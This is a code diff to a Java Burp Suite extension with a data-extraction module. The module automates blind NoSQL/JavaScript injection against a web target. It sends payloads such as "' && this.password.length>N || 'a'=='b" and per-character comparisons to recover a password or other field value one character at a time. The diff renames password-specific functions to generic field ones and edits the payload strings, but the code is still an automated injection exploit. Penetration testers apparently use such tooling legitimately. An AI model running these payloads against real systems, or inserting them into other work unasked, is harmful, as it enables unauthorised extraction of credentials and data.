@@ -451,7 +451,7 @@ public class NNN implements BurpExtension {
                         number++;
                         infoPane.setText(infoPane.getText() + "\n");
                         if (!sb.isEmpty()){
-                            infoPane.setText(infoPane.getText() + "[i] Extracted fieldname: " + sb + "\n");
+                            infoPane.setText(infoPane.getText() + "[i] Extracted field name: " + sb + "\n");
                         }
                     }
                 }
@@ -471,12 +471,12 @@ public class NNN implements BurpExtension {
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
 
-                // Identify password length
-                int passwordLength = identifyPasswordLength(requestResponse, startIndex, endIndex, httpService);
+                // Identify field length
+                int fieldLength = identifyFieldLength(requestResponse, startIndex, endIndex, httpService);
 
-                // Enumerate the password
-                if (passwordLength > 0) {
-                    enumeratePassword(requestResponse, startIndex, endIndex, httpService, passwordLength);
+                // Enumerate the field
+                if (fieldLength > 0) {
+                    enumerateField(requestResponse, startIndex, endIndex, httpService, fieldLength);
                 }
             } catch (Exception e) {
                 api.logging().logToError("[!] Data Extraction module failed");
@@ -485,7 +485,7 @@ public class NNN implements BurpExtension {
         }).start();
     }
 
-    private static int identifyPasswordLength(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService) {
+    private static int identifyFieldLength(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService) {
         int length = 0;
         try {
             HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
@@ -494,7 +494,7 @@ public class NNN implements BurpExtension {
             ArrayList<HttpRequestResponse> responseList = new ArrayList<>(); // Collect responses to later analyze them
             if (request2send.method().equals("GET")) {
                 for (int i = 1; i < 50; i++) {  // assuming the max length of password is less than 100
-                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "' && this.password.length>" + i + " || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
+                    request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + ".length>" + i + " || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
                     response2receive = api.http().sendRequest(request2send);
                     responseList.add(response2receive);
                 }
@@ -509,7 +509,7 @@ public class NNN implements BurpExtension {
         return length;
     }
 
-    private static void enumeratePassword(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService, int passwordLength) {
+    private static void enumerateField(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex, HttpService httpService, int passwordLength) {
         try {
             HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString());
             HttpRequestResponse response2receive;
@@ -520,15 +520,13 @@ public class NNN implements BurpExtension {
                 infoPane.setText(infoPane.getText() + "[i] Identified characters:\n");
                 for (int i = 0; i < passwordLength; i++) {
                     responseList = new ArrayList<>(); // Collect responses to later analyze them
-                    for (char c = 'a'; c <= 'z'; c++) {  // assuming the password is lowercase letters
-                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "' && this.password[" + i + "]=='" + c + "' || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
+                    for (char c = 'a'; c <= 'z'; c++) {  // assuming the field is lowercase letters
+                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + api.utilities().urlUtils().encode(fieldValue + "[" + i + "]=='" + c + "' || 'a'=='b") + requestResponse.request().toString().substring(endIndex));
                         response2receive = api.http().sendRequest(request2send);
                         responseList.add(response2receive);
-
                     }
                     try {
                         String query = printSuspiciousResponses(responseList).get(0).request().query();
-//                        infoPane.setText(infoPane.getText() + "[i] Identified character at position " + i + ": "+ api.utilities().urlUtils().decode(query) + "\n");
                     } catch (Exception e) {
                         api.logging().logToError("[!] No correct character found for position: " + i);
                         api.logging().logToError(e);
